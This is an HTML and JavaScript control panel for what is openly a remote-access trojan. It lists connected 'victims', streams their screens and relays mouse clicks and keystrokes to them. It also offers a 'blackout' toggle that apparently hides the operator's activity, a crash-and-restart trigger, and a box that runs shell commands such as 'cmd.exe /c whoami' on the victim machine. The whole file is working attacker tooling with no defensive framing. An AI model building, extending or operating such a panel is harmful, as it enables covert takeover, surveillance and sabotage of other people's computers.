<!DOCTYPE html>
<html>
<head>
  <title>Remote Desktop Viewer</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; background: #111; overflow: hidden; font-family: monospace; }
    body { cursor: none; }
    #screen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      display: block;
      background: #000;
    }

    #cursor {
      position: fixed;
      pointer-events: none;
      z-index: 1000;
      width: 24px; height: 24px;
      border: 2px solid #0f0;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      box-shadow: 0 0 8px rgba(0,255,0,0.7);
      display: none;
    }
    #cursor::after {
      content: '';
      position: absolute;
      top: 50%; left: 50%;
      width: 2px; height: 2px;
      background: #0f0;
      transform: translate(-50%, -50%);
      box-shadow: 0 0 4px #0f0;
    }

    #info {
      position: fixed; bottom: 6px; right: 6px;
      font-size: 11px; color: #888;
      background: rgba(0,0,0,0.7); padding: 3px 10px;
      border-radius: 3px; pointer-events: none; z-index: 999;
      font-family: monospace; white-space: nowrap;
    }
    #info .coords { color: #ff0; }
    #info.on { color: #4c4; }
    #info.off { color: #c44; }

    #sidebar {
      position: fixed; top: 0; left: 0;
      width: 280px; height: 100vh;
      background: rgba(10,10,10,0.95);
      border-right: 1px solid #2a2a2a;
      z-index: 1001;
      padding: 10px;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      gap: 6px;
      font-size: 12px;
      transition: transform 0.2s;
    }
    #sidebar.collapsed { transform: translateX(-270px); }
    #sidebar-toggle {
      position: fixed; top: 8px; left: 8px;
      z-index: 1002;
      background: rgba(0,0,0,0.7);
      color: #aaa;
      border: 1px solid #333;
      border-radius: 4px;
      padding: 4px 10px;
      cursor: pointer;
      font-size: 16px;
      font-family: monospace;
    }
    #sidebar-toggle:hover { color: #0f0; border-color: #0f08; }

    .panel-title {
      color: #0f0;
      font-size: 13px;
      font-weight: bold;
      padding-bottom: 4px;
      border-bottom: 1px solid #2a2a2a;
      margin-bottom: 4px;
    }

    .victim-item {
      padding: 6px 8px;
      margin: 2px 0;
      border-radius: 4px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
      border: 1px solid transparent;
    }
    .victim-item:hover { background: #1a1a1a; }
    .victim-item.active { background: #0f02; border-color: #0f08; }
    .victim-dot { width: 8px; height: 8px; border-radius: 50%; background: #0f0; flex-shrink: 0; }
    .victim-id { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #ddd; }
    .victim-res { color: #666; font-size: 10px; }
    .victim-mons { color: #888; font-size: 9px; }

    /* ── Monitor selector (crop) ── */
    #monitor-selector {
      display: none;
      margin-top: 4px;
    }
    #monitor-selector select {
      width: 100%;
      background: #1a1a1a;
      color: #ddd;
      border: 1px solid #444;
      padding: 5px;
      border-radius: 4px;
      font-family: monospace;
      font-size: 11px;
    }
    #monitor-selector select:focus { outline: none; border-color: #0f08; }
    .mon-label { color: #888; font-size: 10px; margin-bottom: 2px; }

    #controls {
      margin-top: 6px;
      border-top: 1px solid #2a2a2a;
      padding-top: 6px;
      display: none;
      flex-direction: column;
      gap: 4px;
    }
    .ctrl-btn {
      width: 100%;
      padding: 7px;
      border-radius: 4px;
      cursor: pointer;
      font-family: monospace;
      font-size: 11px;
      border: 1px solid #444;
      background: #1a1a1a;
      color: #ddd;
      text-align: center;
    }
    .ctrl-btn:hover { background: #2a2a2a; }
    .ctrl-btn.blackout { border-color: #f80; color: #f80; }
    .ctrl-btn.blackout.active { background: #f802; border-color: #0f0; color: #0f0; }
    .ctrl-btn.crash { border-color: #f44; color: #f44; }
    .ctrl-btn.crash:hover { background: #400; }
    .ctrl-btn.exec { border-color: #48f; color: #48f; }

    .status-line { color: #888; font-size: 10px; padding: 2px 0; }
    .status-line .val { color: #ddd; }
    .status-line .warn { color: #f80; }

    #exec-result { display: none; margin-top: 4px; }
    #exec-result textarea {
      width: 100%;
      height: 120px;
      background: #0a0a0a;
      border: 1px solid #333;
      color: #0f0;
      font-family: monospace;
      font-size: 10px;
      padding: 4px;
      border-radius: 3px;
      resize: vertical;
    }
    #exec-cmd-input {
      width: 100%;
      background: #0a0a0a;
      border: 1px solid #333;
      color: #0f0;
      font-family: monospace;
      font-size: 10px;
      padding: 5px;
      border-radius: 3px;
      margin-bottom: 3px;
    }

    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: #0a0a0a; }
    ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
  </style>
</head>
<body>
  <canvas id="screen"></canvas>
  <div id="cursor"></div>
  <div id="sidebar-toggle">☰</div>

  <div id="sidebar">
    <div class="panel-title">◉ Targets</div>
    <div id="victim-list"></div>

    <!-- Monitor selector -->
    <div id="monitor-selector">
      <div class="mon-label">◉ View Region</div>
      <select id="monitor-select">
        <option value="full">Full Virtual Desktop</option>
      </select>
    </div>

    <div id="controls">
      <div class="panel-title">◉ Controls</div>
      <button id="btn-blackout" class="ctrl-btn blackout">⬛ Toggle Blackout</button>
      <button id="btn-crash" class="ctrl-btn crash">💀 Crash & Restart</button>
      <div class="status-line">
        Blackout: <span class="val" id="blackout-status-val">OFF</span>
        <span class="val" id="blackout-method-val"></span>
      </div>
      <hr style="border-color:#2a2a2a; margin:6px 0;">
      <div class="panel-title">◉ Execute</div>
      <input type="text" id="exec-cmd-input" placeholder="cmd.exe /c whoami" />
      <button id="btn-exec" class="ctrl-btn exec">⏎ Execute</button>
      <div id="exec-result">
        <textarea id="exec-output" readonly></textarea>
      </div>
    </div>
  </div>

  <div id="info">Connecting...</div>

<script>
    (function() {
      const canvas = document.getElementById('screen');
      const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
      const info = document.getElementById('info');
      const cursorEl = document.getElementById('cursor');
      const victimListEl = document.getElementById('victim-list');
      const controlsEl = document.getElementById('controls');
      const monitorSelector = document.getElementById('monitor-selector');
      const monitorSelect = document.getElementById('monitor-select');
      const sidebar = document.getElementById('sidebar');

      let selectedVictim = null;
      let victimMonitors = [];

      // ── FIXED: separate "display" dimensions (what we render) from "full" dimensions (for click math) ──
      let displayW = 1920;
      let displayH = 1080;
      let fullW = 1920;
      let fullH = 1080;
      let cropOffsetX = 0;
      let cropOffsetY = 0;
      let scaleX = 1;
      let scaleY = 1;

      let frameImg = null;
      let frameReady = false;
      let blackoutState = false;
      let lastFrameTime = 0;
      let fpsCounter = 0;
      let currentFPS = 0;

      const socket = io({
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000
      });

      function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.width = canvas.width + 'px';
        canvas.style.height = canvas.height + 'px';
        // Scale maps from the DISPLAY dimensions (what the victim is sending us) to canvas
        scaleX = displayW / canvas.width;
        scaleY = displayH / canvas.height;
      }
      window.addEventListener('resize', resize);

      function render() {
        if (frameReady && frameImg) {
          frameReady = false;
          ctx.drawImage(frameImg, 0, 0, canvas.width, canvas.height);
          frameImg = null;
          fpsCounter++;
        }
        requestAnimationFrame(render);
      }
      requestAnimationFrame(render);

      // FPS counter
      setInterval(() => {
        currentFPS = fpsCounter;
        fpsCounter = 0;
      }, 1000);

      function processFrame(data) {
        const blob = new Blob([data], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        const img = new Image();
        img.onload = function() {
          frameImg = img;
          frameReady = true;
          URL.revokeObjectURL(url);
        };
        img.onerror = function() { URL.revokeObjectURL(url); };
        img.src = url;
      }

      // ── FIXED: compute remote coordinates with crop offset ──
      function getRemoteCoords(e) {
        const rect = canvas.getBoundingClientRect();
        let cssX = e.clientX - rect.left;
        let cssY = e.clientY - rect.top;
        cssX = Math.max(0, Math.min(cssX, canvas.width));
        cssY = Math.max(0, Math.min(cssY, canvas.height));

        // Map CSS position → position within the displayed (cropped) image
        let imgX = Math.round(cssX * scaleX);
        let imgY = Math.round(cssY * scaleY);

        // Add crop offset → full desktop coordinates for the victim
        let remoteX = imgX + cropOffsetX;
        let remoteY = imgY + cropOffsetY;

        return { cssX, cssY, imgX, imgY, remoteX, remoteY };
      }

      function moveCursor(e) {
        const rect = canvas.getBoundingClientRect();
        cursorEl.style.display = 'block';
        cursorEl.style.left = (rect.left + (e.clientX - rect.left)) + 'px';
        cursorEl.style.top = (rect.top + (e.clientY - rect.top)) + 'px';
      }

      canvas.addEventListener('mousemove', function(e) {
        moveCursor(e);
        const coords = getRemoteCoords(e);
        info.innerHTML = `${displayW}x${displayH} ${currentFPS}fps · <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
      });

      canvas.addEventListener('mouseleave', function() { cursorEl.style.display = 'none'; });

      canvas.addEventListener('click', function(e) {
        if (!selectedVictim) return;
        const coords = getRemoteCoords(e);
        socket.emit('click', { x: coords.remoteX, y: coords.remoteY, btn: 'left' });
        moveCursor(e);
      });

      canvas.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        if (!selectedVictim) return;
        const coords = getRemoteCoords(e);
        socket.emit('click', { x: coords.remoteX, y: coords.remoteY, btn: 'right' });
        moveCursor(e);
      });

      document.addEventListener('keydown', function(e) {
        if (!selectedVictim) return;
        const prevent = ['Space', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Tab'];
        if (prevent.includes(e.code) || e.key === ' ') e.preventDefault();
        if (e.key === 'F5' || e.key === 'F12' ||
            (e.ctrlKey && 'rRwWtTnN'.includes(e.key))) return;
        socket.emit('key', e.key);
      });

      function renderVictimList(list) {
        victimListEl.innerHTML = '';
        if (!list || list.length === 0) {
          victimListEl.innerHTML = '<div style="color:#666;padding:4px;">No victims online</div>';
          controlsEl.style.display = 'none';
          monitorSelector.style.display = 'none';
          return;
        }
        list.forEach(v => {
          const item = document.createElement('div');
          item.className = 'victim-item' + (selectedVictim === v.id ? ' active' : '');
          const mons = v.monitors || [];
          const monStr = mons.length > 0 ? mons.map((m, i) => m.primary ? `#${i+1} (P)` : `#${i+1}`).join(', ') : '';
          item.innerHTML = `
            <div class="victim-dot"></div>
            <div class="victim-id">${v.id}</div>
            <div style="text-align:right;flex-shrink:0;">
              <div class="victim-res">${v.w}x${v.h}</div>
              ${monStr ? `<div class="victim-mons">${monStr}</div>` : ''}
            </div>
          `;
          item.addEventListener('click', function() {
            selectedVictim = v.id;
            victimMonitors = v.monitors || [];
            blackoutState = false;
            document.getElementById('btn-blackout').textContent = '⬛ Toggle Blackout';
            document.getElementById('btn-blackout').className = 'ctrl-btn blackout';
            document.getElementById('blackout-status-val').textContent = 'OFF';
            document.getElementById('blackout-method-val').textContent = '';

            // Remember the full desktop dimensions
            fullW = v.w;
            fullH = v.h;

            populateMonitorSelector(v.monitors);
            // Default to "full" view
            socket.emit('select-victim', { id: v.id, monitorIndex: null });
            renderVictimList(list);
            info.textContent = `Selecting ${v.id}...`;
          });
          victimListEl.appendChild(item);
        });
      }

      function populateMonitorSelector(mons) {
        monitorSelect.innerHTML = '';
        const optFull = document.createElement('option');
        optFull.value = 'full';
        optFull.textContent = 'Full Virtual Desktop';
        monitorSelect.appendChild(optFull);

        if (mons && mons.length > 0) {
          mons.forEach((m, i) => {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = `Monitor ${i+1} (${m.w}x${m.h} @ ${m.x},${m.y})${m.primary ? ' [Primary]' : ''}`;
            monitorSelect.appendChild(opt);
          });
        }

        monitorSelect.value = 'full';
        monitorSelector.style.display = 'block';
      }

      // ── FIXED: monitor selector change sends proper monitorIndex ──
      monitorSelect.addEventListener('change', function() {
        if (!selectedVictim) return;
        const val = this.value;

        if (val === 'full') {
          cropOffsetX = 0;
          cropOffsetY = 0;
          displayW = fullW;
          displayH = fullH;
          resize();
          socket.emit('select-victim', { id: selectedVictim, monitorIndex: null });
          info.textContent = `Selecting ${selectedVictim} (full desktop)...`;
        } else {
          const idx = parseInt(val);
          const mon = victimMonitors[idx];
          if (mon) {
            cropOffsetX = mon.x;
            cropOffsetY = mon.y;
            displayW = mon.w;
            displayH = mon.h;
            resize();
            socket.emit('select-victim', { id: selectedVictim, monitorIndex: idx });
            info.textContent = `Selecting ${selectedVictim} (monitor ${idx+1})...`;
          }
        }
      });

      document.getElementById('sidebar-toggle').addEventListener('click', function() {
        sidebar.classList.toggle('collapsed');
      });

      document.getElementById('btn-blackout').addEventListener('click', function() {
        if (!selectedVictim) return;
        blackoutState = !blackoutState;
        socket.emit('toggle-blackout', blackoutState);
        this.textContent = blackoutState ? '⬛ Deactivate Blackout' : '⬛ Toggle Blackout';
        this.className = 'ctrl-btn blackout' + (blackoutState ? ' active' : '');
      });

      document.getElementById('btn-crash').addEventListener('click', function() {
        if (!selectedVictim) return;
        if (confirm('Trigger crash + restart?')) {
          socket.emit('trigger-crash');
          this.textContent = '💀 Triggered!';
          setTimeout(() => { this.textContent = '💀 Crash & Restart'; }, 3000);
        }
      });

      document.getElementById('btn-exec').addEventListener('click', function() {
        const cmd = document.getElementById('exec-cmd-input').value.trim();
        if (!cmd || !selectedVictim) return;
        socket.emit('exec-victim', cmd);
        document.getElementById('exec-result').style.display = 'block';
        document.getElementById('exec-output').value = '> ' + cmd + '\nWaiting...\n';
      });
      document.getElementById('exec-cmd-input').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') document.getElementById('btn-exec').click();
      });

      // ══════════════════════════════════════
      // SOCKET EVENTS
      // ══════════════════════════════════════
      socket.on('connect', function() {
        info.textContent = 'Connected — registering as viewer';
        info.className = 'on';
        socket.emit('register-viewer');
      });

      socket.on('victim-list', function(list) {
        renderVictimList(list);
      });

      // ── FIXED: victim-info uses displayW/displayH from server ──
      socket.on('victim-info', function(data) {
        victimMonitors = data.monitors || [];

        // Store full desktop dimensions for click math
        fullW = data.w;
        fullH = data.h;

        // Use display dimensions (might be cropped)
        displayW = data.displayW || data.w;
        displayH = data.displayH || data.h;
        cropOffsetX = data.cropOffsetX || 0;
        cropOffsetY = data.cropOffsetY || 0;

        resize();
        controlsEl.style.display = 'flex';
        monitorSelector.style.display = 'block';
        populateMonitorSelector(data.monitors);

        // Set the dropdown to match
        if (data.monitorIndex !== null && data.monitorIndex !== undefined) {
          monitorSelect.value = String(data.monitorIndex);
        } else {
          monitorSelect.value = 'full';
        }

        info.className = 'on';
        const viewInfo = data.crop ? `(monitor ${data.monitorIndex !== null ? data.monitorIndex + 1 : 'full'})` : '(full desktop)';
        info.innerHTML = `${displayW}x${displayH} ${currentFPS}fps · <span class="coords">Viewing ${data.id} ${viewInfo}</span>`;
      });

      socket.on('frame', function(f) {
        if (f.buf) processFrame(f.buf);
      });

      socket.on('blackout-status', function(data) {
        document.getElementById('blackout-status-val').textContent = data.active ? 'ON' : 'OFF';
        document.getElementById('blackout-status-val').style.color = data.active ? '#f80' : '#ddd';
        if (data.method) {
          document.getElementById('blackout-method-val').textContent = '(' + data.method + ')';
        }
      });

      socket.on('exec-result', function(data) {
        document.getElementById('exec-result').style.display = 'block';
        let out = '> ' + data.cmd + '\n';
        if (data.stdout) out += data.stdout + '\n';
        if (data.stderr) out += '[STDERR] ' + data.stderr + '\n';
        if (data.error) out += '[ERROR] ' + data.error + '\n';
        out += '[Exit]\n';
        document.getElementById('exec-output').value = out;
      });

      socket.on('system', function(data) {
        info.textContent = data.msg || data;
        info.className = 'on';
      });

      socket.on('error', function(data) {
        info.textContent = 'Error: ' + (data.msg || 'unknown');
        info.className = 'off';
      });

      socket.on('disconnect', function() {
        info.textContent = 'Disconnected';
        info.className = 'off';
      });

      socket.on('connect_error', function() {
        info.textContent = 'Reconnecting...';
        info.className = 'off';
      });

      resize();
    })();
  </script>
</body>
</html>
